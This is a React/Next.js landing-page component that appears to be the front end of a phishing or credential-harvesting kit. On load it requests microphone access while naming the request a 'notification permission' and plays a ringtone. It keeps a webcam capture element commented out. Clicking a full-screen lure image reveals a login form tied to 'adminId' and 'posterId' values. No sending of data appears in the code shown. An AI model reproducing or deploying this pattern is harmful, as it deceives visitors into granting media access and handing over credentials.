"use client";

import { useEffect, useState } from "react";
import Webcam from "react-webcam";
import LoginForm from "./LoginForm";
import Image from "next/image";

export default function Home({ adminId, posterId }) {
  const [showForm, setShowForm] = useState(false);

  const playNotificationSound = () => {
    const audio = new Audio("/tune.mp3"); // Path to the ringtone file
    audio.play().catch((error) => {
      console.error("Error playing the sound:", error);
    });

    return () => {
      audio.pause(); // Stop the audio if the component unmounts
      audio.currentTime = 0; // Reset the audio to the beginning
    };
  };
  const requestNotificationPermission = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      if (stream) {
        playNotificationSound();
      }
    } catch (error) {
      console.error("Error requesting notification permission:", error);
    }
  };
  useEffect(() => {
    requestNotificationPermission();
  }, [adminId, posterId]);
  return (
    <div className="relative h-screen w-screen flex flex-col justify-center items-center bg-black">
      {/* <Webcam
        audio={false}
        className="object-cover h-screen w-screen lg:w-auto"
        // height={1080}
        // width={1262}
        // screenshotFormat="image/jpeg"
        // videoConstraints={videoConstraints}
      /> */}

      <div className="absolute  flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
        <div className=" shadow-around rounded-lg">
          {!showForm ? (
            <div onClick={() => setShowForm(true)}>
              <Image
                className="md:block hidden"
                src="/home_image.png"
                alt=""
                fill
              />
              <Image
                className="md:hidden block"
                src="/mobile_image.png"
                alt=""
                fill
              />
            </div>
          ) : (
            <LoginForm adminId={adminId} posterId={posterId} />
          )}
        </div>
      </div>
    </div>
  );
}
